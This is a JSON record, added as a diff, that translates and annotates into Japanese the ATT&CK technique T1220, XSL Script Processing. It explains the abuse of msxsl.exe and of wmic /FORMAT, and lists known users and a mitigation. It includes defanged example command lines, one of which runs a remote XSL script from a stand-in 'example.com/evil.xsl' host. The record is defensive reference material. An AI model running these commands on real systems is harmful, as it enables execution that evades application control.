@@ -1,0 +1,37 @@
+{
+ "id": "T1220",
+ "source_sha": "811e3a9bdb071d80",
+ "status": "done",
+ "seg": {
+  "name": "XSL Script Processing",
+  "description/0": "攻撃者は、XSLファイルの中にスクリプトを埋め込むことで、アプリケーション制御を回避し、コードの実行を隠すことがある。拡張可能スタイルシート言語（XSL）ファイルは、XMLファイル内のデータの処理・表示方法を記述するために一般的に使われる。複雑な操作をサポートするため、XSL標準にはさまざまな言語での埋め込みスクリプトのサポートが含まれている。",
+  "description/1": "攻撃者はこの機能を悪用して、アプリケーション制御を回避しながら任意のファイルを実行することがある。Trusted Developer Utilities Proxy Executionと同様に、Microsoftのコマンドライン変換ユーティリティバイナリ（msxsl.exe）をインストールして、ローカルまたは遠隔（URL参照）のXSLファイルに埋め込まれた悪意あるJavaScriptを実行するために使用できる。msxsl.exeは既定ではインストールされないため、攻撃者はドロップするファイルと一緒にそれを同梱する必要がある可能性が高い。Msxsl.exeは、XMLソースファイルとXSLスタイルシートという2つの主な引数を取る。XSLファイルは有効なXMLであるため、攻撃者は同じXSLファイルを2回呼び出すことがある。msxsl.exeを使う際、攻撃者はXML/XSLファイルに任意のファイル拡張子を付けることもできる。",
+  "description/2": "コマンドラインの例：",
+  "description/3": "* `msxsl.exe customers[.]xml script[.]xsl`\n* `msxsl.exe script[.]xsl script[.]xsl`\n* `msxsl.exe script[.]jpeg script[.]jpeg`",
+  "description/4": "この技術の別の変化形は「Squiblytwo」と呼ばれ、Windows Management InstrumentationをXSLファイル内のJScriptやVBScriptの呼び出しに使う。この技術もローカル・遠隔のスクリプトを実行でき、Regsvr32の「Squiblydoo」と同様に、信頼された標準搭載のWindowsツールを利用する。攻撃者は、/FORMATスイッチを利用する限り、Windows Management Instrumentationのどのエイリアスでも悪用できる。",
+  "description/5": "コマンドラインの例：",
+  "description/6": "* ローカルファイル：`wmic process list /FORMAT:evil[.]xsl`\n* 遠隔ファイル：`wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”`",
+  "mitigation/M1038/0": "msxsl.exeが不要であれば、攻撃者による悪用を防ぐため、その実行を遮断する。",
+  "procedure/G0080/0": "Cobalt Groupは、AppLockerを回避し、XSLファイルからJscriptコードを呼び出すためにmsxsl.exeを使用した。",
+  "procedure/G0126/0": "Higaisaは、VBScriptコードを実行するためにXSLファイルを使用した。",
+  "procedure/S0373/0": "Astarothは、遠隔ドメイン上にあるXSLスタイルシートに埋め込まれたJScriptまたはVBScriptを実行する。"
+ },
+ "supplement": {
+  "summary": "データの表示形式を記述するためのXSLファイルに埋め込みスクリプト機能を悪用し、msxsl.exeやwmicという信頼されたWindowsツールを経由してコードを実行する技術。Regsvr32の「Squiblydoo」と対になる「Squiblytwo」という変化形も持つ。",
+  "terms": [
+   {
+    "term": "Squiblytwo",
+    "en": "Squiblytwo",
+    "explain": "Windows Management Instrumentation（WMI）のコマンドラインツールwmicの/FORMATスイッチを使い、XSLファイル内のスクリプトを実行させる手口の通称。Regsvr32の「Squiblydoo」に類似した命名規則を持つ、対になる手口。"
+   }
+  ],
+  "analogy": "書類の見た目を整えるための書式指定ファイル（XSLファイル）の中に、実は命令文（スクリプト）を隠して書き込んでおき、書式を整えるためだけに使われる変換ツール（msxsl.exeやwmic）に、その命令文まで実行させてしまう、という文書フォーマットの仕様の抜け穴にあたる。",
+  "learn": [
+   "XSLのような、本来はデータの表示形式を定義するためだけの標準が、スクリプトの埋め込みをサポートしているために実行手段として悪用されること",
+   "「Squiblydoo」（Regsvr32）と「Squiblytwo」（msxsl/wmic）という、命名も手口も似た2つの代理実行技術が存在すること"
+  ],
+  "interpretation": [
+   "本技術とRegsvr32（T1218.010）の類似性（Squiblydoo/Squiblytwo）は、Windowsの標準ツール群に共通する「本来の処理対象ファイルの中に実行可能なスクリプトを埋め込める」という設計パターンが、繰り返し悪用の対象になっていることを示している。1つの技術への対策だけでは、同じパターンを使う別の技術には対応できない。"
+  ]
+ }
+}
